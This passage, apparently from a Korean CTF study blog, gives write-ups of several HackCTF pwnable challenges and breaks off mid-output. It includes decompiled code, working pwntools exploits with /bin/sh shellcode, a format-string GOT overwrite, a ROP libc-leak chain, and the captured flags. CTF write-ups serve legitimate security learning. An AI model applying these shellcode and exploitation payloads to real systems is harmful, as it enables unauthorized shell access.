class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-6D30h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;buf: %p\n&quot;</span>, &amp;v4);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>코드를 보면 printf 함수를 이용해서 v4의 주소를 출력하고, gets 함수를 이용해서 v4의 값을 입력하고 있는 것을 볼 수 있습니다. 이번 문제도 gets 함수로 입력을 받고, 검증 로직이 없어 BOF 취약점이 발생합니다. 그래서 쉘을 실행시켜주는 함수가 있나 확인해 보니 없었고, ROP를 하려고 보호 기법도 확인해보니 아무 것도 되어 있지 않아 그냥 쉘 코드를 박아주기로 했습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ .&#x2F;Simple_size_bof </span><br><span class="line">삐빅- 자살방지 문제입니다.</span><br><span class="line">buf: 0x7ffc7b644760</span><br><span class="line"></span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ .&#x2F;Simple_size_bof </span><br><span class="line">삐빅- 자살방지 문제입니다.</span><br><span class="line">buf: 0x7ffc99272180</span><br><span class="line"></span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ .&#x2F;Simple_size_bof </span><br><span class="line">삐빅- 자살방지 문제입니다.</span><br><span class="line">buf: 0x7fffcba94780</span><br><span class="line"></span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ </span><br></pre></td></tr></table></figure><p><strong>바이너리 파일을 실행해보니 buf의 주소가 계속 바뀌는 것을 알 수 있습니다. 아마 ASLR이 적용되어 있는 거 같습니다. 하지만 그냥 바이너리가 실행되는 동시에 출력되는 buf의 주소를 가져와서 사용하면 됩니다. 마찬가지로 64 비트 쉘 코드도 검색해서 구했습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3005</span>)</span><br><span class="line"></span><br><span class="line">shell_code = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recvline()[<span class="number">5</span>:], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;buf addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(buf_addr)))</span><br><span class="line"></span><br><span class="line">payload = shell_code</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * (<span class="number">27960</span> - <span class="built_in">len</span>(shell_code)) <span class="comment"># buf + sfp - shell_code_length</span></span><br><span class="line">payload += p64(buf_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python simple_size_bof.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3005: Done</span><br><span class="line">[*] buf addr : 0x7fff99022510</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">$ cat flag</span><br><span class="line">HackCTF&#123;s000000_5m4ll_4nd_5m4ll_51z3_b0f&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{s000000_5m4ll_4nd_5m4ll_51z3_b0f}</p></blockquote><hr><p>HackCTF Challenge : Simple_Overflow_ver_2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+13h] [ebp-89h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">128</span>]; <span class="comment">// [esp+14h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+94h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="number">121</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data : &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot; %[^\n]s&quot;</span>, s) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = i;</span><br><span class="line">        <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !(i &amp; <span class="number">0xF</span>) )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%p: &quot;</span>, &amp;s[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %c&quot;</span>, (<span class="keyword">unsigned</span> __int8)s[i]);</span><br><span class="line">        <span class="keyword">if</span> ( i % <span class="number">16</span> == <span class="number">15</span> )</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nAgain (y/n): &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( __isoc99_scanf(<span class="string">&quot; %c&quot;</span>, &amp;v5) &amp;&amp; (v5 == <span class="number">121</span> || v5 == <span class="number">89</span>) );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>코드를 보면 scanf 함수를 이용해서 s의 값을 입력해주고, printf로 입력 값을 출력해주고, <code>&quot;Again (y/n): &quot;</code>를 출력해서 한 번 더 입력할 거냐고 묻는다. <code>y</code>를 누르면 다시 입력을 하고, <code>n</code>을 누르면 종료를 합니다. 하지면 s의 크기는 136인데 입력은 무제한으로 받을 수 있어 BOF 취약점이 발생합니다. 그래서 그냥 이번 문제도 shell code를 s에 넣어주고, ret를 s의 주소로 덮어주면 쉘을 딸 수 있습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3006</span>)</span><br><span class="line"></span><br><span class="line">shell_code = <span class="string">&quot;\x31\xC9\x8D\x41\x0B\x99\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Data : &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recvline()[<span class="number">0</span>:<span class="number">10</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;buf addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(buf_addr)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Again (y/n): &quot;</span>, <span class="string">&quot;Y&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = shell_code</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shell_code)) <span class="comment"># buffer + sfp + shellcode_length</span></span><br><span class="line">payload += p32(buf_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Data : &quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python simple_overflow_ver2.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3006: Done</span><br><span class="line">[*] buf addr : 0xffe73ef0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">0xffe73ef0:  1 � \x8d A \x0b\x99 h &#x2F; s h</span><br><span class="line">Again (y&#x2F;n): $ cat flag</span><br><span class="line">$ cat  flag</span><br><span class="line">HackCTF&#123;y0u_d1d_7h3_45516nm3n7_5ucc355fully!&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{y0u_d1d_7h3_45516nm3n7_5ucc355fully!}</p></blockquote><hr><h2 id="PWN-D-6-2021-02-01"><a href="#PWN-D-6-2021-02-01" class="headerlink" title="PWN D+6 (2021.02.01)"></a>PWN D+6 (2021.02.01)<br></h2><hr><p>HackCTF Challenge : You are silver</p><p>이번 문제는 64 bit FSB 취약점을 이용한 문제를 가져왔습니다. 64 bit는 32 bit와 다르게 레지스터를 출력 후에 스택 정보를 출력해줍니다.<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v6 = <span class="number">50</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your name&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">46</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s, <span class="number">46LL</span>);</span><br><span class="line">  v5 = get_tier(v6);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드를 보면 fgets 함수를 이용해서 46 바이트만큼 s에 입력해주고, printf 함수를 이용해서 출력해주고 있습니다. 하지만 여기서 포맷스트링이 정의되어 있지 않아 FSB 취약점이 발생합니다. 그 후에 get_tier 함수의 반환 값을 v5에 넣고, v5를 출력하는 것을 볼 수 있습니다.<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">get_tier</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">50</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt; <span class="number">65</span> || a1 &lt;= <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1 &gt; <span class="number">75</span> || a1 &lt;= <span class="number">65</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a1 &gt; <span class="number">75</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;\nYou are challenger.&quot;</span>);</span><br><span class="line">          result = <span class="number">4LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nYou are master.&quot;</span>);</span><br><span class="line">        result = <span class="number">3LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nYou are platinum.&quot;</span>);</span><br><span class="line">      result = <span class="number">2LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nYou are silver.&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_tier 함수를 보면 인자 값 a1을 이용해서 티어를 정하는 것을 볼 수 있고, 각 티어별로 반환하는  1, 2, 3, 4 입니다.<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">play_game</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;master can&#x27;t play game. Sorry! :(&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( a1 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Challenger. Take this first!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat ./flag&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SILVER can&#x27;t play game.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Who are you? get out!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;platinum can&#x27;t play game. :(&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그리고 함수를 보니 play_game라는 함수가 있는데, 해당 함수의 인자 값인 a1이 4면 FLAG를 읽는 것을 볼 수 있습니다. 즉, FSP 취약점을 이용해서 printf 함수의 got를 play_game에 주소로 바꿔주면 되고, v6의 값도 75보다 크게 바꿔 줘야 하는데, 이는 변수 위를 보면 s 변수가 위치한 범위 끝에 v5가 위치하기 때문제 2바이트만큼은 덮을 수 있습니다.<br></p><ul><li>시나리오<br></li></ul><ol><li>FSB 취약점을 이용해서 printf got의 주소를 play_game 함수로 바꿔줌.</li><li>fgets 함수에서 마지막 2바이트까지 꽉 채워서 보내주면 알아서 v5 값이 바뀜.<br></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3022</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./you_are_silver&quot;</span>)</span><br><span class="line"></span><br><span class="line">play_game = e.sym[<span class="string">&#x27;play_game&#x27;</span>]</span><br><span class="line">printf_got = <span class="number">0x601028</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;play_game addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(play_game)))</span><br><span class="line">log.info(<span class="string">&quot;printf_got : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(printf_got)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%4196055c&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%8$ln11&quot;</span></span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload += <span class="string">&quot;s&quot;</span> * (<span class="number">46</span> - <span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>여기서 <code>%8$ln11</code> 부분에서 8을 준 이유는 printf got에 값이 8번 째에서 나오기 때문입니다. 레지스터가 모두 출력 되고, 스택이 출력되는데 6번 째는 <code>%4196055</code>, 7번 째는 <code>c%8$ln11</code>, 그리고 8번째에 <code>printf_got</code>가 출력이 됩니다. 또한 <code>%8$ln11</code>에서 마지막 <code>11</code>은 8 바이트를 모두 채우기 위한 패딩입니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">                                              &#x3D;11(\x10</span><br><span class="line">You are challenger.</span><br><span class="line">Challenger. Take this first!</span><br><span class="line">HackCTF&#123;N0w_Y0u_4re_b4side_0f_F4K3R&#125;</span><br><span class="line">Who are you? get out!</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{N0w_Y0u_4re_b4side_0f_F4K3R}</p></blockquote><hr><p>HackCTF Challenge : ROP</p><p>이번 문제는 그냥 32 bit에서 간단한 ROP이므로 익스 코드만 작성하겠습니다.<br></p><ul><li>시나리오<br></li></ul><ol><li>write 함수를 이용해서 read 주소를 릭한다. 여기서 릭한 주소는 나중에 libc base 주소를 구할 때 사용</li><li>read 함수를 이용해서 bss에 <code>/bin/sh\x00</code>을 입력 받는다.</li><li>read 함수를 이용해서 read got를 system 함수의 주소로 덮는다.</li><li>read 함수를 호출하면 system 함수가 호출 될 것 이고, 이때 인자로는 bss를 넘겨주면 쉘이 따진다.<br></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3021</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_got = e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pppr = <span class="number">0x8048509</span></span><br><span class="line">bss = e.bss()</span><br><span class="line">read_offset = <span class="number">0xd4350</span></span><br><span class="line">system_offset = <span class="number">0x3a940</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;write@plt : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_plt)))</span><br><span class="line">log.info(<span class="string">&#x27;write@got : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_got)))</span><br><span class="line">log.info(<span class="string">&#x27;read@plt : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_plt)))</span><br><span class="line">log.info(<span class="string">&#x27;read@got : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#BOF</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">140</span> <span class="comment"># buffer + sfp</span></span><br><span class="line"></span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(read_got)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss)</span><br><span class="line">payload += p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(read_got)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += <span class="string">&quot;aaaa&quot;</span></span><br><span class="line">payload += p32(bss)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = leak - read_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">log.info(<span class="string">&#x27;libc_base addr : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.info(<span class="string">&#x27;system addr : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF&#x2F;rOP$ python exploit.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3021: Done</span><br><span class="line">[*] 